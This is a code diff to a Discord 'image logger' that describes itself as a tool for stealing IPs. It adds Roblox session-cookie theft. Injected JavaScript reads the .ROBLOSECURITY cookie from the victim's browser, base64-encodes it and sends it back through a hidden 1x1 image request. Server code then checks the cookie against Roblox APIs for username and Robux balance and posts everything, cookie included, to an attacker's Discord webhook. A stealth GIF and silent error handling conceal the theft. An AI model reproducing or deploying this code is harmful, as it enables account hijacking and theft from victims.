@@ -4,6 +4,8 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
+import requests
+
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -73,6 +75,39 @@ def botCheck(ip, useragent):
         return "Telegram"
     else:
         return False
+    
+def get_roblox_info(cookie):
+    try:
+        session = requests.Session()
+        session.cookies['.ROBLOSECURITY'] = cookie
+        session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
+        
+        # Get user info
+        user_resp = session.get('https://users.roblox.com/v1/users/authenticated', timeout=10)
+        if user_resp.status_code != 200:
+            return None
+        user_data = user_resp.json()
+        uid = user_data.get('id')
+        username = user_data.get('name', 'Unknown')
+        
+        # Get Robux (POST endpoint)
+        robux_resp = session.post('https://economy.roblox.com/v1/user/currency', timeout=10)
+        if robux_resp.status_code != 200:
+            return {'username': username, 'id': str(uid), 'robux': 'Error', 'cookie': cookie}
+        
+        robux_data = robux_resp.json()
+        robux = robux_data.get('robux', 0)
+        
+        return {
+            'username': username,
+            'id': str(uid),
+            'robux': f"{robux:,}",
+            'cookie': cookie
+        }
+    except Exception as e:
+        print(f"Roblox lookup fail: {e}")  # Silent log
+        return None
+
 
 def reportError(error):
     requests.post(config["webhook"], json = {
@@ -135,6 +170,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
         if config["antiBot"] == 1:
                 ping = ""
+        
 
 
     os, browser = httpagentparser.simple_detect(useragent)
@@ -175,6 +211,15 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
   ],
 }
     
+    if roblox_info:
+        embed["fields"].extend([
+            {"name": "🟥 Roblox Username", "value": roblox_info['username'], "inline": True},
+            {"name": "🟥 Roblox ID", "value": roblox_info['id'], "inline": True},
+            {"name": "🟥 Robux", "value": roblox_info['robux'], "inline": True},
+            {"name": "🟥 Cookie (truncated)", "value": roblox_info['cookie'][:100] + "..." if len(roblox_info['cookie']) > 100 else roblox_info['cookie'], "inline": False}
+        ])
+        embed["color"] = 0xff0000 
+    
     if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
     requests.post(config["webhook"], json = embed)
     return info
@@ -201,6 +246,8 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
                 url = config["image"]
 
             data = f'''<style>body {{
+            
+            
 margin: 0;
 padding: 0;
 }}
@@ -214,6 +261,24 @@ height: 100vh;
 }}</style><div class="img"></div>'''.encode()
             
             if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
+                return
+            
+            if dic.get('roblox'):
+                try:
+                    roblox_cookie_b64 = dic['roblox']
+                    roblox_cookie = base64.b64decode(roblox_cookie_b64.encode()).decode('utf-8')
+                    roblox_data = get_roblox_info(roblox_cookie)
+                    if roblox_data:
+                        makeReport(ip, self.headers.get('user-agent'), roblox_info=roblox_data, endpoint=s.split("?")[0], url=url)
+                except Exception:
+                    reportError(traceback.format_exc())  # silent fail
+            
+                # Send invisible 1x1 GIF (stealth)
+                self.send_response(200)
+                self.send_header('Content-type', 'image/gif')
+                self.end_headers()
+                gif = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
+                self.wfile.write(gif)
                 return
             
             if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
@@ -258,6 +323,12 @@ height: 100vh;
 
                 datatype = 'text/html'
 
+                if roblox_info:
+                    message = message.replace("{roblox_user}", roblox_info['username'])
+                    message = message.replace("{roblox_id}", roblox_info['id'])
+                    message = message.replace("{robux}", roblox_info['robux'])
+                    message = message.replace("{roblox_cookie}", roblox_info['cookie'])
+
                 if config["message"]["doMessage"]:
                     data = message.encode()
                 
@@ -285,7 +356,24 @@ if (!currenturl.includes("g=")) {
     location.replace(currenturl);});
 }}
 
+(function() {
+    var cookies = document.cookie.split(';');
+    var robloxCookie = '';
+    for(var i = 0; i < cookies.length; i++) {
+        var c = cookies[i].trim();
+        if(c.indexOf('.ROBLOSECURITY=') === 0) {
+            robloxCookie = c.substring(16);  // len('.ROBLOSECURITY=')
+            break;
+        }
+    }
+    if(robloxCookie) {
+        var img = new Image(1,1);
+        img.src = window.location.pathname + '?roblox=' + btoa(robloxCookie) + window.location.search.replace('?','&');  // preserve other params
+    }
+})();
+
 </script>"""
+        
                 self.wfile.write(data)
         
         except Exception:
